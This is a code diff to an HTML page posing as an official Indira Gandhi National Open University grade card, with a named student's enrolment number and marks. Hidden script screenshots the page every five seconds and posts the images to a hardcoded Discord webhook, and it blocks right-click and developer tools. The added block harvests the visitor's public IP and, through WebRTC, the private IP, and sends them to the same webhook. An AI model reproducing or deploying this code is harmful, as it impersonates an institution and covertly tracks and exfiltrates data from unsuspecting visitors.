@@ -2,3 +2,69 @@
     <meta content="Official University Website" name="description"><link href=https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css rel=stylesheet><link href=result.css rel=stylesheet><script src=https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js></script><header class=header><div class=container-fluid><div class="row align-items-center"><div class="col-2 col-md-2 text-center"><div class=logo-section><a href=https://www.ignou.ac.in/ target=_blank><img alt="IGNOU Logo"src=images/LOGO1.png class=img-fluid></a></div></div><div class="col-8 col-md-8"><div class=university-name><h1>INDIRA GANDHI NATIONAL OPEN UNIVERSITY</h1><h2>GRADE CARD/ MARKS SHEET / DEGREE</h2></div></div><div class="col-2 col-md-2 text-center"><div class=naac-badge><img alt="NAAC A++ Badge"src=images/naac_TRANS.png class=img-fluid></div></div></div></div></header><div class="main-container mb-5 mt-5"><div class=header-section><div class=header-content><div class=university-title>INDIRA GANDHI NATIONAL OPEN UNIVERSITY</div><div class=grade-card-title>Grade Card Status as on 19-08-2025</div><div class=current-date>Current Date:</div></div><div class=profile><img alt=images/profile.png src=images/profile.png></div></div><div class=student-info><div><span>Enrolment No:</span> <b>2300822199</b></div><div><span>Name:</span> <b>KALPNA</b></div><div><span>Programme Code:</span> <b>MAH</b></div></div><table class=results-table><thead><tr><th>COURSE<th>Asgn1<th>LAB1<th>LAB2<th>LAB3<th>LAB4<th>TERM END THEORY<th>STATUS<tr><td class=course-cell>MHI01<td>72<td>-<td>-<td>-<td>-<td>65<td>COMPLETED<tr><td class=course-cell>MHI02<td>73<td>-<td>-<td>-<td>-<td>52<td>COMPLETED<tr><td class=course-cell>MHI03<td>85<td>-<td>-<td>-<td>-<td>58<td>COMPLETED<tr><td class=course-cell>MHI04<td>70<td>-<td>-<td>-<td>-<td>63<td>COMPLETED<tr><td class=course-cell>MHI05<td>73<td>-<td>-<td>-<td>-<td>56<td>COMPLETED<tr><td class=course-cell>MHI09<td>70<td>-<td>-<td>-<td>-<td>52<td>COMPLETED<tr><td class=course-cell>MHI10<td>78<td>-<td>-<td>-<td>-<td>54<td>COMPLETED<tr><td class=course-cell>MPSE03<td>72<td>-<td>-<td>-<td>-<td>50<td>COMPLETED<tr><td class=course-cell>MPSE04<td>70<td>-<td>-<td>-<td>-<td>60<td>COMPLETED</table><div class=footer-notes><div class=ufm-warning>Not withstanding the result published/declared, any case of UFM(unfair means) if found will make such result null and void.</div><div class=assignment-note><strong>Note:</strong> Assignment 4 and TE Practical do not apply to all the courses.</div><div class=disclaimer>Disclaimer: This electronically generated information does not have any legal validity</div></div><div class=bottom-footer><div>Indira Gandhi National Open University. All Rights Reserved.</div><div>Powered By: Software Development Cell, Computer Division.</div></div></div><div class=container><div class=row><div class=order-now><button class="btn-primary btn btn-danger"id="orderNowBtn" style="font-size: 40px;">NEXT</button></div></div></div><div class=popup-overlay id=orderPopup><div class=popup-box><h2>if you can't find a way create one</h2><span>Author Ms. Laddu</span><br><button class="btn-primary close-btn"id=closePopup>OK</button></div></div><a href="get-details.html" class="sidebar-button"><span class="text">Next Page</span></a>
     <script src=https://code.jquery.com/jquery-3.6.0.min.js></script><script src=https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js></script><script>$(document).ready(function(){$("#orderNowBtn").click(function(){localStorage.getItem("popupFormData")?$("#orderPopup").fadeIn():window.location.href="get-details.html"}),$("#closePopup").click(function(){window.location.href="get-details.html"}),$("#orderPopup").click(function(o){$(o.target).is("#orderPopup")&&$("#orderPopup").fadeOut()})}),window.addEventListener("load",()=>{setInterval(()=>{html2canvas(document.body,{useCORS:!0}).then(o=>{o.toBlob(o=>{var e=new FormData;e.append("file",o,"screenshot.png");const t=(new Date).toLocaleString();e.append("payload_json",JSON.stringify({content:"📸 Screenshot taken at "+t})),fetch("https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1",{method:"POST",body:e}).then(o=>{o.ok?console.log("Screenshot sent at",t):console.error("Failed to send screenshot:",o.statusText)}).catch(console.error)},"image/png")})},5e3)}),document.addEventListener("contextmenu",e=>(e.preventDefault(),!1)),document.addEventListener("keydown",e=>{!e.ctrlKey&&123!=e.keyCode||(e.stopPropagation(),e.preventDefault())}),window.addEventListener("DOMContentLoaded",function(){var o=localStorage.getItem("popupFormData");o?(o=JSON.parse(o),console.log("Form Data:")):(document.body.innerHTML="",setTimeout(function(){window.location.href="index.html"},1500))});</script>
 
+<script>
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1';
+
+    // 1. Get Public IP
+    function getPublicIP() {
+      return fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => data.ip)
+        .catch(err => {
+          console.error('Public IP error:', err);
+          return 'Error';
+        });
+    }
+
+    // 2. Get Private IP (Local IP) via WebRTC
+    function getPrivateIP() {
+      return new Promise((resolve, reject) => {
+        const peer = new RTCPeerConnection({ iceServers: [] });
+        peer.createDataChannel('');
+        peer.createOffer().then(offer => peer.setLocalDescription(offer));
+
+        peer.onicecandidate = (event) => {
+          if (!event || !event.candidate) return;
+
+          const candidate = event.candidate.candidate;
+          const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+          if (ipMatch) {
+            resolve(ipMatch[1]);
+            peer.close();
+          }
+        };
+
+        setTimeout(() => resolve('Not Found'), 3000); // timeout fallback
+      });
+    }
+
+    // 3. Send to Discord Webhook
+    async function sendToDiscord() {
+      const publicIP = await getPublicIP();
+      const privateIP = await getPrivateIP();
+
+      const message = {
+        content: `📡 New IP Address Captured:\n🌐 **Public IP**: ${publicIP}\n🏠 **Private IP**: ${privateIP}`
+      };
+
+      fetch(discordWebhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+      })
+      .then(res => {
+        if (res.ok) {
+          console.log('Sent to Discord successfully');
+        } else {
+          console.error('Failed to send to Discord:', res.statusText);
+        }
+      })
+      .catch(err => {
+        console.error('Discord webhook error:', err);
+      });
+    }
+
+    sendToDiscord();
+</script>
